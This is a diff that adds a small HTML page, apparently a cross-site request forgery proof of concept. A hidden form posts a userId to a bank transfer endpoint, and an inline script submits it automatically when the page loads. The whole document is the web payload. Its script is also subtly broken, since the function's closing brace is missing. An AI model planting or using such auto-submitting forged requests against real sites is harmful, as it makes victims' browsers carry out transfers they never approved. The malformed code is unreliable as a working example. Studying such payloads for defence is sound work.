@@ -1,0 +1,10 @@
+<form id="csrf" action="http://bank.com/transfer.do" method="POST">
+    <input type="hidden" name="userId" value="123abc"/>
+</form>
+
+<script>
+    (function () {
+        var form = document.getElementById("csrf");
+        form.submit();
+    )();
+</script>
